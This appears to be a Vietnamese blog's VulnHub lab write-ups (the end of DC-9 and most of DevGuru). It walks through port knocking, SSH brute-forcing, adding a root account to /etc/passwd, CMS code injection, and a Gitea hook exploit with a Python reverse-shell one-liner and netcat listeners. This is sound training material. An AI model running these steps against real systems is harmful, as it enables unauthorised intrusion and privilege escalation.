cửa.Thằng ml Knockd này như kiểu là một thằng đứng ở tầng liên kết (trong mô hình OSI). Nó lắng nghe toàn bộ lưu lượng truy cập và khi nó nghe được một chuỗi knock knock giống như mật khẩu gõ cửa, nó sẽ thực thi lệnh được xác định trong tệp cấu hình.Phân tích tệp cấu hình knockd.conf. Có thể thấy, Knockd đang muốn lắng nghe lần lượt các gói tin TCP syn ở các cổng theo thứ tự 7469, 8475, 9842 để thực hiện lệnh mở cổng 22-SSH. Đây là lí do tại sao Nmap không thể quét ra được cổng 22-SSH trên máy chủ, vì nó có mở đéo đâu mà quét được.Lúc này knock knock knock để mở cổng 22-SSH thôi nào :D\n$ knock 10.10.10.104 7469 8475 9842$ nmap -p- 10.10.10.104Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-04 22:55 +07Nmap scan report for 10.10.10.104Host is up (0.0038s latency).Not shown: 65533 closed portsPORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 1.35 seconds\nGood! Cái này trước đây tôi đéo biết, vậy nên làm bài này khiến tôi có thêm một kiến thức mới, không hề tệ với một bài lab easy.Có SSH rồi, giờ brute-force thôi. Tại sao lại là brute-force? Vì ở kia tôi đã lấy được danh sách người dùng trong hệ thống từ file &#x2F;etc&#x2F;passwd. Password thì lấy được từ Sqlmap ở trên, mặc dù nó chả liên quan cho lắm nhưng biết đâu có user nào đấy chủ quan đặt password trên web trùng với password trên server thì sao.\nHydraLần này screen-shot Terminal cho nó màu mè\nPrivileges EscalationVới session của user janitor, có một cái file vớ vẩn như thế này.\njanitor@dc-9:~$ ls -altotal 20drwxrwxrwx  5 janitor janitor 4096 Feb  4 21:54 .drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -&gt; /dev/nulldrwxr-xr-x  2 janitor janitor 4096 Feb  4 21:55 dumadrwx------  3 janitor janitor 4096 Feb  4 21:55 .gnupgdrwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putinjanitor@dc-9:~$ cd .secrets-for-putinjanitor@dc-9:~/.secrets-for-putin$ ls -altotal 12drwx------ 2 janitor janitor 4096 Dec 29  2019 .drwxrwxrwx 5 janitor janitor 4096 Feb  4 21:54 ..-rwx------ 1 janitor janitor   66 Dec 29  2019 passwords-found-on-post-it-notes.txtjanitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txtBamBam01Passw0rdsmellycatsP0Lic#10-4B4-Tru3-0014uGU5T-NiGHts\nHmm… lại có thểm một vài mật khẩu nữa, nối vào cuối file password.txt rồi gọi lại Hydra xem có lấy thêm được account nào trong hệ thống không.He, có thêm của fredf.Với mấy user tìm được bên trên thì đều không có tên trong danh sách khách mời của sudoers, mỗi fredf là có.\nfredf@dc-9:~$ sudo -lMatching Defaults entries for fredf on dc-9:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser fredf may run the following commands on dc-9:    (root) NOPASSWD: /opt/devstuff/dist/test/testfredf@dc-9:~$ /opt/devstuff/dist/test/testUsage: python test.py read append\nPhần này tôi bỏ qua SUID, vì tìm rồi và chả có mẹ gì. Tập trung vào &#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test&#x2F;test. Tìm xem cái file test.py ở đâu và có nội dung gì.\nfredf@dc-9:~$ find / -name &quot;test.py&quot; 2&gt;/dev/null/opt/devstuff/test.py/usr/lib/python3/dist-packages/setuptools/command/test.pyfredf@dc-9:~$ ls -al /opt/devstuff/test.py-rw-r--r-- 1 root root 257 Feb  5 00:25 /opt/devstuff/test.pyfredf@dc-9:~$ cat /opt/devstuff/test.py#!/usr/bin/pythonimport sysif len (sys.argv) != 3 :    print (&quot;Usage: python test.py read append. Adudu&quot;)    sys.exit (1)else :    f = open(sys.argv[1], &quot;r&quot;)    output = (f.read())    f = open(sys.argv[2], &quot;a&quot;)    f.write(output)    f.close()\nFile này chỉ có quyền đọc thôi, không có quyền sửa. Nhưng đọc nội dung xem nó làm cái gì.Sau câu lệnh else, nó thực hiện đọc nội dung file sys.argv[1] và nối (appent) vào file sys.argv[2], với quyền Root. ĐÙ!Thế thì bây giờ tôi sẽ tự tạo một tài khoản bằng cách chèn thêm vào cuối file &#x2F;etc&#x2F;passwd với ID 0, vì trong Linux, user có ID 0 thì mặc định là Root.\nfredf@dc-9:~$ echo minhdeptraivcl:$(openssl passwd 00000):0:0:root:/root:/bin/bash &gt; duma.txtfredf@dc-9:~$ cat duma.txt minhdeptraivcl:FLvn5eWX/KeFQ:0:0:root:/root:/bin/bashfredf@dc-9:~$ sudo /opt/devstuff/dist/test/test duma.txt /etc/passwdfredf@dc-9:~$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin...janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bashminhdeptraivcl:FLvn5eWX/KeFQ:0:0:root:/root:/bin/bashfredf@dc-9:~$ su minhdeptraivclPassword: 00000root@dc-9:/home/fredf# iduid=0(root) gid=0(root) groups=0(root)\n\nDone, Ez!Việc có quyền ghi file với quyền của Root giống như leo thang với các trình editer như Vim hay Nano vậy, có thể sửa đổi những file nhạy cảm như &#x2F;etc&#x2F;passwd, &#x2F;etc&#x2F;shadow và một loạt các file cấu hình quan trọng khác trong hệ thống của Linux.\n","categories":["VulnHub"],"tags":["vulnhub","write up","easy"]},{"title":"[VulnHub] DevGuru","url":"/2020/12/27/devguru-vulnhub/","content":"\nOverviewLink download: DevGuruDifficulty: Intermediate (Depends on experience)\n\nInformation GatheringNmapĐầu tiên, vẫn là phải kiếm xem địa chỉ IP của machine này là gì.\n$ nmap 10.10.10.0/24Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 21:20 +07Nmap scan report for 10.10.10.13Host is up (0.00029s latency).Not shown: 998 closed portsPORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpNmap done: 256 IP addresses (2 hosts up) scanned in 3.12 seconds\nYep. 10.10.10.13. Giờ thì liệt kê đống port đang public.\n$ nmap -p- 10.10.10.13Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-02 20:04 +07Nmap scan report for 10.10.10.13Host is up (0.00014s latency).Not shown: 65532 closed portsPORT     STATE SERVICE22/tcp   open  ssh80/tcp   open  http8585/tcp open  unknownNmap done: 1 IP address (1 host up) scanned in 1.30 seconds\nỞ đây có 3 cổng, với 2 cổng quen thuộc là 22-SSH và 80-HTTP, cổng 8585 chạy gì đó chưa biết, mò xem nó chạy cái quần què gì.\n$ nmap -p 22,80,8585 -sV -sC 10.10.10.13Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 21:20 +07Nmap scan report for 10.10.10.11Host is up (0.00059s latency).PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e (RSA)|   256 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 (ECDSA)|_  256 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd (ED25519)80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-generator: DevGuru| http-git: |   10.10.10.11:80/.git/|     Git repository found!|     Repository description: Unnamed repository; edit this file &#x27;description&#x27; to name the...|     Last commit message: Update config |     Remotes:|       http://devguru.local:8585/frank/devguru-website.git|_    Project type: PHP application (guessed from .gitignore)|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Corp - DevGuru8585/tcp open  unknown| fingerprint-strings: |   GenericLines: |     HTTP/1.1 400 Bad Request|     Content-Type: text/plain; charset=utf-8|     Connection: close|     Request|   GetRequest: |     HTTP/1.0 200 OK|     Content-Type: text/html; charset=UTF-8|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647|     Set-Cookie: i_like_gitea=f5cb85ba00f5ac55; Path=/; HttpOnly|     Set-Cookie: _csrf=eq2VCGxTulo0mUCtx873_fFheTc6MTYwOTEwNDA0MjgwMDY1Mzk3NA; Path=/; Expires=Mon, 28 Dec 2020 21:20:42 GMT; HttpOnly|     X-Frame-Options: SAMEORIGIN|     Date: Sun, 27 Dec 2020 21:20:42 GMT|     &lt;!DOCTYPE html&gt;|     &lt;html lang=&quot;en-US&quot; class=&quot;theme-&quot;&gt;|     &lt;head data-suburl=&quot;&quot;&gt;|     &lt;meta charset=&quot;utf-8&quot;&gt;|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;|     &lt;title&gt; Gitea: Git with a cup of tea &lt;/title&gt;|     &lt;link rel=&quot;manifest&quot; href=&quot;/manifest.json&quot; crossorigin=&quot;use-credentials&quot;&gt;|     &lt;meta name=&quot;theme-color&quot; content=&quot;#6cc644&quot;&gt;|     &lt;meta name=&quot;author&quot; content=&quot;Gitea - Git with a cup of tea&quot; /&gt;|     &lt;meta name=&quot;description&quot; content=&quot;Gitea (Git with a cup of tea) is a painless|   HTTPOptions: |     HTTP/1.0 404 Not Found|     Content-Type: text/html; charset=UTF-8|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647|     Set-Cookie: i_like_gitea=f37dba54c746a30d; Path=/; HttpOnly|     Set-Cookie: _csrf=ga_W3gROV5xX9EySESK1ME01kAQ6MTYwOTEwNDA0MjgxNzgyMTExMA; Path=/; Expires=Mon, 28 Dec 2020 21:20:42 GMT; HttpOnly|     X-Frame-Options: SAMEORIGIN|     Date: Sun, 27 Dec 2020 21:20:42 GMT|     &lt;!DOCTYPE html&gt;|     &lt;html lang=&quot;en-US&quot; class=&quot;theme-&quot;&gt;|     &lt;head data-suburl=&quot;&quot;&gt;|     &lt;meta charset=&quot;utf-8&quot;&gt;|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;|     &lt;title&gt;Page Not Found - Gitea: Git with a cup of tea &lt;/title&gt;|     &lt;link rel=&quot;manifest&quot; href=&quot;/manifest.json&quot; crossorigin=&quot;use-credentials&quot;&gt;|     &lt;meta name=&quot;theme-color&quot; content=&quot;#6cc644&quot;&gt;|     &lt;meta name=&quot;author&quot; content=&quot;Gitea - Git with a cup of tea&quot; /&gt;|_    &lt;meta name=&quot;description&quot; content=&quot;Gitea (Git with a c1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8585-TCP:V=7.91%I=7%D=12/27%Time=5FE8983C%P=x86_64-pc-linux-gnu%...Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 89.14 seconds\nCó thể thấy cổng 8585 đang chạy dịch vụ HTTP, nhưng chưa biết chính xác nó là gì, phiên bản bao nhiêu, biết thế cái đã.Vào thử web trên cổng 8585.Okay, Gitea, nó giống như Github, một nơi lưu trữ và quản lý source code. Cứ kệ đấy cái đã, giờ vào cái web trên cổng 80 coi mặt mũi nó ra sao.Một trang landing, không có gì nhiều ở đây cả. Liệt kê các thư mục và tệp tin của cái web này ra xem có vẹo gì nữa không.\n$ ./dirsearch.py -u http://10.10.10.13/ -e html,php,txt -x 403  _|. _ _  _  _  _ _|_    v0.4.1 (_||| _) (/_(_|| (_| )Extensions: html, php, txt | HTTP method: GET | Threads: 30 | Wordlist size: 9791Error Log: #Target: http://10.10.10.11/Output File: #[21:28:10] Starting: [21:28:14] 301 -  309B  - /.git  -&gt;  http://10.10.10.11/.git/[21:28:14] 200 -   14B  - /.git/COMMIT_EDITMSG[21:28:14] 200 -   23B  - /.git/HEAD[21:28:14] 200 -  276B  - /.git/config[21:28:14] 200 -  109B  - /.git/FETCH_HEAD[21:28:14] 200 -   73B  - /.git/description[21:28:14] 200 -  240B  - /.git/info/exclude[21:28:14] 200 -    1MB - /.git/index[21:28:14] 200 -  307B  - /.git/logs/HEAD[21:28:14] 301 -  325B  - /.git/logs/refs/heads  -&gt;  http://10.10.10.11/.git/logs/refs/heads/[21:28:14] 301 -  319B  - /.git/logs/refs  -&gt;  http://10.10.10.11/.git/logs/refs/[21:28:14] 200 -  307B  - /.git/logs/refs/heads/master[21:28:14] 301 -  327B  - /.git/logs/refs/remotes  -&gt;  http://10.10.10.11/.git/logs/refs/remotes/[21:28:14] 301 -  334B  - /.git/logs/refs/remotes/origin  -&gt;  http://10.10.10.11/.git/logs/refs/remotes/origin/[21:28:14] 200 -  284B  - /.git/logs/refs/remotes/origin/master[21:28:14] 301 -  320B  - /.git/refs/heads  -&gt;  http://10.10.10.11/.git/refs/heads/[21:28:14] 301 -  322B  - /.git/refs/remotes  -&gt;  http://10.10.10.11/.git/refs/remotes/[21:28:14] 301 -  329B  - /.git/refs/remotes/origin  -&gt;  http://10.10.10.11/.git/refs/remotes/origin/[21:28:14] 200 -  173B  - /.git/packed-refs[21:28:14] 301 -  319B  - /.git/refs/tags  -&gt;  http://10.10.10.11/.git/refs/tags/[21:28:14] 200 -   41B  - /.git/refs/remotes/origin/master[21:28:14] 200 -  413B  - /.gitignore[21:28:15] 200 -    2KB - /.htaccess[21:28:21] 200 -   12KB - /0[21:28:23] 200 -   18KB - /About[21:28:26] 200 -    1KB - /README.md[21:28:30] 200 -   18KB - /about[21:28:38] 200 -    4KB - /adminer.php[21:28:43] 302 -  402B  - /backend/  -&gt;  http://10.10.10.11/backend/backend/auth[21:28:47] 301 -  311B  - /config  -&gt;  http://10.10.10.11/config/[21:29:51] 200 -   12KB - /index.php[21:29:56] 301 -  312B  - /modules  -&gt;  http://10.10.10.11/modules/[21:30:03] 301 -  312B  - /plugins  -&gt;  http://10.10.10.11/plugins/[21:30:07] 200 -   10KB - /services[21:30:07] 200 -   10KB - /services/[21:30:10] 301 -  312B  - /storage  -&gt;  http://10.10.10.11/storage/[21:30:12] 301 -  311B  - /themes  -&gt;  http://10.10.10.11/themes/Task Completed\nỐ ồ! Một đống thứ liên quan đến git, ờ thế… git là gì?\n\nhttps://vi.wikipedia.org/wiki/Git_(ph%E1%BA%A7n_m%E1%BB%81m)Git (&#x2F;ɡɪt&#x2F;, đọc là “Ghít”) là phần mềm quản lý mã nguồn phân tán được phát triển bởi Linus Torvalds vào năm 2005, ban đầu dành cho việc phát triển nhân Linux. Hiện nay, Git trở thành một trong các phần mềm quản lý mã nguồn phổ biến nhất. Git là phần mềm mã nguồn mở được phân phối theo giấy phép công cộng GPL2.\n\nỜm, đại khái nó là một thứ giúp cho việc quản lý mã nguồn được ngon nghẻ hơn, cái này thì anh em nào làm dev sẽ quá là rõ. Git khiến việc phát triển dự án dễ dàng hơn, đặc biệt khi phát triển theo team, tránh các “xung đột” không đáng có trong code và rất nhiều lợi ích khác mà nó đem lại.Và với nhiều lợi ích như thế, git thực sự phổ biến. Nhưng việc sử dụng git một cách hiệu quả và an toàn thì không phải ai cũng nắm được.Khái niệm cơ bản của git, là nó lưu lại tất cả các phiên bản sau mỗi lần thực hiện commit. Điều này là một lợi ích to lớn, vì khi phiên bản mới gặp lỗi và chưa thể khắc phục, nhà phát triển có thể sử dụng phiên bản trước đó đã được lưu trong git để roll back lại. Đây cũng là lí do khiến git, nếu không được cấu hình đúng cách, nó sẽ khiến toàn bộ mã nguồn từ trước đến nay của dự án bị lộ, hoặc password, private key, thông tin cấu hình… bị đánh cắp.Vậy thì mấy cái xàm xàm tôi nói ở trên thì liên quan đéo gì đến bài này. Nhìn kìa. Cả một đống thông tin liên quan đến git lù lù thế kia, giờ làm cách nào đó để đem nó về máy mình và mổ xẻ, tôi hoàn toàn có thể có được mã nguồn của trang này. Thử xem nhé.\nGit Dumper$ ./gitdumper.sh  http://10.10.10.13/.git/ ~/boot2root/devguru############ GitDumper is part of https://github.com/internetwache/GitTools## Developed and maintained by @gehaxelt from @internetwache## Use at your own risk. Usage might be illegal in certain circumstances. # Only for educational purposes!###########[*] Destination folder does not exist[+] Creating /home/#####/boot2root/devguru/.git/[+] Downloaded: HEAD[-] Downloaded: objects/info/packs[+] Downloaded: description[+] Downloaded: config[+] Downloaded: COMMIT_EDITMSG[+] Downloaded: index[-] Downloaded: packed-refs[+] Downloaded: refs/heads/master[-] Downloaded: refs/remotes/origin/HEAD[-] Downloaded: refs/stash[+] Downloaded: logs/HEAD[+] Downloaded: logs/refs/heads/master[-] Downloaded: logs/refs/remotes/origin/HEAD[-] Downloaded: info/refs[+] Downloaded: info/exclude[-] Downloaded: /refs/wip/index/refs/heads/master[-] Downloaded: /refs/wip/wtree/refs/heads/master[-] Downloaded: objects/24/f020e71d01899c89a440e2e8e5d65d016f9473[-] Downloaded: objects/3f/1f4cd74e0cea0d64ab9a14875954fb0c39eeaf[-] Downloaded: objects/4d/d5e1d2e02195ac03ed685ac05024f0faef128a[-] Downloaded: objects/72/819740b89eb5f315808c8648d55bd2db369493[-] Downloaded: ...bla...bla...bla...\nChống cằm 3 phút cuối cùng nó cũng tải xong một đống thứ lằng nhằng.Vào thư mục mà tôi vừa tải một đống thứ kia về, kiểm tra git log, git status các kiểu xem sao.\n$ git logcommit 7de9115700c5656c670b34987c6fbffd39d90cf2 (HEAD -&gt; master)Author: frank &lt;frank@devguru.local&gt;Date:   Thu Nov 19 18:42:03 2020 -0600    first commit\nOkay, có mỗi cái first commit thôi, giờ thì checkout nó ra để xem điều bất cmn ngờ.Ở đây tôi muốn checkout ra phiên bản mới nhất, nên dùng dấu chấm, còn muốn chọn phiên bản nào để checkout thì copy 7 ký tự đầu của cái hash kia kìa rồi paste vào (VD: git checkout 7de9115)\n$ git checkout .Updated 2491 paths from the index$ ls -altotal 416drwxr-xr-x 9 ##### #####   4096 Jan  2 20:55 .drwxr-xr-x 3 ##### #####   4096 Jan  2 20:47 ..-rw-r--r-- 1 ##### ##### 362514 Jan  2 20:55 adminer.php-rw-r--r-- 1 ##### #####   1640 Jan  2 20:55 artisandrwxr-xr-x 2 ##### #####   4096 Jan  2 20:55 bootstrapdrwxr-xr-x 2 ##### #####   4096 Jan  2 20:55 configdrwxr-xr-x 6 ##### #####   4096 Jan  2 20:55 .git-rw-r--r-- 1 ##### #####    413 Jan  2 20:55 .gitignore-rw-r--r-- 1 ##### #####   1678 Jan  2 20:55 .htaccess-rw-r--r-- 1 ##### #####   1173 Jan  2 20:55 index.phpdrwxr-xr-x 5 ##### #####   4096 Jan  2 20:55 modulesdrwxr-xr-x 3 ##### #####   4096 Jan  2 20:55 plugins-rw-r--r-- 1 ##### #####   1518 Jan  2 20:55 README.md-rw-r--r-- 1 ##### #####    551 Jan  2 20:55 server.phpdrwxr-xr-x 6 ##### #####   4096 Jan  2 20:55 storagedrwxr-xr-x 4 ##### #####   4096 Jan  2 20:55 themes\nBoom! Toàn bộ mã nguồn của cái web này ở đây cả &#x3D;)) mà cũng quên béng mất cái URL dẫn đến trang login vào cơ sở dữ liệu là adminer.php.Vào xem file cấu hình database lấy username password rồi login vào thôi, ez game.Lúc này, sau khi login thành công vào, thấy có cái bảng liên quan đến backend_users, mặt mũi nó như thế này này.Có thể thấy ngay mật khẩu người dùng được mã hóa sử dụng bcrypt, một dạng hash để phòng tránh việc brute-force. Ùi giời ơi, vào đến đây rồi thì việc đéo gì phải brute-force cho mệt, tạo luôn một cái hash bcrypt chèn thẳng vào là xong à!Để ý mật khẩu của frank đang là:$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKKVới $2y$10, có nghĩa rằng bcrypt ở đây đang có số rounds là 10. EZ!!!Đây là hash của tôi với password là 00000.$2y$10$HiSr8anMnFN&#x2F;kx1.bKKUe.eHPWNBEetsTVj4aNibZcYu71bcRychmChèn nó vào ô password, chiếm được tài khoản frank. Sorry Frank &#x3D;))Login vào &#x2F;backend nào!Chuyển sang CMS, khá buồn cười là cái Framework này cho phép chỉnh sửa code ngay trên trang quản trị CMS, ở đây có thể upload ảnh ọt, file, chèn code bla bla vân vân mây mây, có một đống cách để có được shell.Sau một hồi ngồi làm quen cú pháp, giờ thì chèn reverse shell vào.Save lại, và đồng thời phải bật netcat để lắng nghe trên cổng đã đặt trước trong code kia (port 22222). Đoạn code này sẽ được thực thi khi mà page Home được load, vậy nên giờ chỉ cần truy cập vào nó là đã lấy được www-data shell rồi.\n$ nc -nlvp 22222                                                                                 listening on [any] 22222 ...connect to [10.10.10.1] from (UNKNOWN) [10.10.10.13] 54142/bin/sh: 0: can&#x27;t access tty; job control turned off$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)\nOkay, có shell rồi, nhưng chẳng làm được gì nhiều, ít ra làm được mấy trò hay ho. Xem xem machine này đang có những user nào.\n$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinsyslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin_apt:x:104:65534::/nonexistent:/usr/sbin/nologinlxd:x:105:65534::/var/lib/lxd/:/bin/falseuuidd:x:106:110::/run/uuidd:/usr/sbin/nologindnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologinsshd:x:109:65534::/run/sshd:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falsefrank:x:1000:1000:,,,:/home/frank:/bin/bashmysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false\nHmm, có mỗi thằng frank, www-data cũng không có quyền đọc thư mục &#x2F;home&#x2F;frank.Kiểm tra xem frank có đang chạy cái gì hay không.\n$ ps -aux | grep frankfrank      610  0.7 19.8 1442108 200500 ?      Ssl  14:04   0:04 /usr/local/bin/gitea web --config /etc/gitea/app.ini\nThấy được là frank đang chạy Gitea, cái web trên cổng 8585 ban nãy nmap quét được ấy. Vẫn hơi bí. Dùng linPEAS xem sao…\nLinPEAShttps://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEASChống cằm ngồi xem linPEAS nó xổ ra một đống loằng toằng ngoằng, phát hiện được một dòng này cực hay ho…\n[+] Backup files?-rw-r--r-- 1 frank frank 56688 Nov 19 19:34 /var/backups/app.ini.bak\nĐây có thể là file backup của file cấu hình app.ini, là file cấu hình của cái thằng Gitea trên cổng 8585 kia kìa. Trong đấy thể éo nào cũng một đống tài khoản mật khẩu cho mà xem &#x3D;))\n$ cat /var/backups/app.ini.bak...; The protocol the server listens on. One of &#x27;http&#x27;, &#x27;https&#x27;, &#x27;unix&#x27; or &#x27;fcgi&#x27;.PROTOCOL                              = httpDOMAIN                                = devguru.localROOT_URL                              = http://devguru.local:8585/; when STATIC_URL_PREFIX is empty it will follow ROOT_URLSTATIC_URL_PREFIX                     = ; The address to listen on. Either a IPv4/IPv6 address or the path to a unix socket.HTTP_ADDR                             = 0.0.0.0; The port to listen on. Leave empty when using a unix socket.HTTP_PORT                             = 8585...[database]; Database to use. Either &quot;mysql&quot;, &quot;postgres&quot;, &quot;mssql&quot; or &quot;sqlite3&quot;.DB_TYPE                               = mysqlHOST                                  = 127.0.0.1:3306NAME                                  = giteaUSER                                  = gitea; Use PASSWD = `your password` for quoting if you use special characters in the password.PASSWD                                = UfFPTF8C8jjxVF2m...; Password Hash algorithm, either &quot;argon2&quot;, &quot;pbkdf2&quot;, &quot;scrypt&quot; or &quot;bcrypt&quot;PASSWORD_HASH_ALGO                    = pbkdf2...\nVậy là có được thông tin đăng nhập vào database, và thông tin liên quan đến thuật toán mã hóa được sử dụng. Database được chạy chung trên cổng 3306 nên tôi hoàn toàn có thể sử dụng &#x2F;adminer để đăng nhập vào.Sau khi đăng nhập, thấy có một bảng user, trong đó có tài khoản của frank, với mật khẩu mã hóa kiểu gì éo biết, nhưng ở ngay dưới đó, phần passwd_hash_algo đang có giá trị là pbkdf2. Để chiếm được tài khoản Gitea của frank, lúc này sẽ phải thay đổi passwd với hash là mật khẩu đã biết.Đến đây thì có 2 cách làm:\n\nCách 1: PBKDF2 yêu cầu 5 tham số đầu vào, đó là Password, Salt, Hash function, Iterations count và Key length. Password và Salt thì có thể tùy ý, nhưng 3 cái còn lại thì tuyệt đối đúng. Nên là phải đi tìm :&#x2F;\nCách 2: Như thông tin có được trên app.ini.bak, passwd_hash_algo chấp nhận 4 loại hash, trong 4 loại này, quen nhất vẫn là bcrypt. Ơ thế, giờ điền mật khẩu hash là bcrypt và để passwd_hash_algo là bcrypt thì sao nhở.Để thể hiện tôi là người thừa thời gian, tôi sẽ làm cả 2 cách :D\n\nVới cách 1, Google và Google thật nhiều, với từ khóa là pbkdf2 gitea default, tôi tìm được:\n\nHash function: SHA256\nIterations count: 10000\nKey length: 50\n\nGiờ thì dễ rồi, dán cái đống này vào một cái chương trình gen PBKDF2 nào đó, rồi chèn hash vào ô passwd là xong thôi.Thể hiện là biết python, nên tôi sẽ tự code, với password là 00000 và salt là botcanhHaiChau\nimport os, binasciifrom backports.pbkdf2 import pbkdf2_hmacsalt = binascii.unhexlify(&#x27;botcanhHaiChau&#x27;) #Ahihipasswd = &quot;00000&quot;.encode(&quot;utf8&quot;)key = pbkdf2_hmac(&quot;sha256&quot;, passwd, salt, 10000, 50)print(binascii.hexlify(key))#7b54b6d699cbf4d2ec3561baf57ebcbfe086e75dbecea8910dade1991eff67c3d139e78ffc26bec1e95b46fbd16a2eeabbf6\nLời nhắn dành cho ai dùng đoạn code trên để làm bài này nhưng vẫn bị sai: Try hard don’t copy!\nVới cách 2, nghe chừng dễ dàng và đỡ tốn thời gian hơn cách 1 rất nhiều. Thực ra lần đầu làm bài này tôi đã mất cả buổi trưa để đuổi theo cách 1, do không để ý những cấu hình khác trong app.ini.bak. Để thực hiện thì giống hệt với cách đổi mật khẩu của frank trên trang &#x2F;backend.Với phiên bản Gitea 1.12.5, có một lỗi CVE-2020-14144(http://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-14144) dẫn đến RCE. Nếu có thể khai thác được lỗi này thành công, thì tôi hoàn toàn có được shell của thằng user frank trong hệ thống dó Gitea được chạy dưới quyền của frank.Cơ bản, với lỗi CVE này, nó đánh vào quá trình xử lý của hook trên phía server, ơ thế… hook là gì?Read &gt;&gt;&gt; https://viblo.asia/p/introduction-to-git-hooks-1qm6RWaNGeJE…Giờ thì tạo một cái Repo mới, sau đó sẽ chèn đoạn mã lấy shell vào 1 trong 3 hook server.Nội dung post-receive lủn củn như thế này:\n#!/bin/shpython3 -c&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.1&quot;,22224));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;\nTạo một thay đổi nào đó trong cái thư mục Duma vừa mới clone về kia, rồi commit, push lên cho Gitea và có được shell &#x3D;))\n$ nc -nlvp 22224listening on [any] 22224 ...connect to [10.10.10.1] from (UNKNOWN) [10.10.10.13] 42062$ iduid=1000(frank) gid=1000(frank) groups=1000(frank)\nPrivileges EscalationOkay, đến màn khó rồi đây.\n$ sudo -lMatching Defaults entries for frank on devguru:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser frank may run the following commands on devguru:    (ALL, !root) NOPASSWD: /usr/bin/sqlite3$ uname -aLinux devguru.local 4.15.0-124-generic #127-Ubuntu SMP Fri Nov 6 10:54:43 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\nVới &#x2F;usr&#x2F;bin&#x2F;sqlite3, có thể lên được Root theo cách này https://gtfobins.github.io/gtfobins/sqlite3/NHƯNG! (ALL, !root), cái này ngăn cản root thực hiện, mọi người dùng khác đều được, trừ root :(Sau khi được hint là kiểm tra phiên bản của sudo, wtf, tôi chưa bao giờ kiểm tra phiên bản của sudo cả! Trước giờ vẫn nghĩ nó là một phần của hệ thống và được phát triển song song, nên không có phiên bản &#x3D;))\n$ sudo --versionSudo version 1.8.21p2Sudoers policy plugin version 1.8.21p2Sudoers file grammar version 46Sudoers I/O plugin version 1.8.21p2\nSudo 